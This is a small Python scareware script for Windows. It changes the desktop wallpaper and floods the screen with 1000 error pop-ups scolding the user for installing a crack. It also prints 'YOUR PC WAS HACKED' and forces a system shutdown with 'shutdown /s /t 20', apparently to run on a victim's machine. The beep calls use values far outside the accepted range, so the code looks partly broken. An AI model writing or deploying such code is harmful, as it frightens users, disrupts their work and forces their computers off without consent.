import ctypes
import os
import tkinter as tk
from tkinter import messagebox
import winsound
import subprocess

def change_wallpaper(image_path):
    if not os.path.exists(image_path):
        show_message("Error", "The specified image path does not exist.")
        return

    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        for _ in range(1000): 
            show_message("Warning", "Why did you install a crack?!")
        print("#ctypes:1000")
    except Exception as e:
        show_message("Error", f"Failed to change wallpaper: {e}")
        
def shutdown_pc():
    winsound.Beep(1000000, 3000000)  
    winsound.Beep(1000000, 200000000000)  
    subprocess.run("shutdown /s /t 20", shell=True) 
def show_message(title, message):
    root = tk.Tk()
    root.withdraw()  
    messagebox.showerror(title, message) 

image_path = "d:\\download\\wallpaperflare.com_wallpaper (2).jpg" 
print("YOUR PC WAS HACKED LOL HAHAH")

change_wallpaper(image_path)
shutdown_pc()
